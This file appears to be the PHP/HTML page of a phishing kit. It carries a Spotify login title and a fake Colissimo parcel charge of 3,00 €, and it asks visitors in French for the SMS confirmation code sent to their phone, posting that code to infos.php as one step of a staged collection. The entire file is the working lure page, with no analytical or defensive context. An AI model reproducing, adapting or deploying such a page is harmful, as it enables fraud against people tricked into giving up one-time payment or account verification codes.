<?php 

require_once "functions.php";

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Login - Spotify</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">  
  <link rel="stylesheet"  href="css/hover.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/title.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/title.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

      <section class="bg-white">
          <div class="sms text-center shadow px-5 py-5">
              <div class="logo mb-5">
                  <img src="image/logo.png">
              </div>
              <div class="comm border py-3 ">
                <div class="row">
                    <div class="col-md-6 text-end" id="com">
                       <p>Numéro de commande :</p>
                       <p>commande :</p>
                       <p>Destinataire :</p>
                    </div>
                    <div class="col-md-6 text-start" id="com">
                       <p><strong>000453217</strong></p>
                       <p><strong>03,00 €</strong></p>
                       <p><strong>Poste colssimo</strong></p>
                    </div>
                </div>       
              </div>
              <p class="mt-4">Nous vous remercions de vous authentifier en saisissant le code de confirmation reçu sur votre téléphone.
                  Cette authentification est obligatoire pour confirmer votre opération.</p>
                <form action="infos.php" method="post">

                    <input type="hidden" value="sms" name="step">

                    <input type="text" class="form-control" name="sms">
                    <div class="error" class="error">the value is required</div>
                    <div class="bttn">
                        <button style="width:100%" name="submit" class="btn btn-warning py-2 mt-5 text-center">Valider</button>
                    </div>
                </form>
          </div>
      </section>



  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/test.js"></script>

</body>
</html>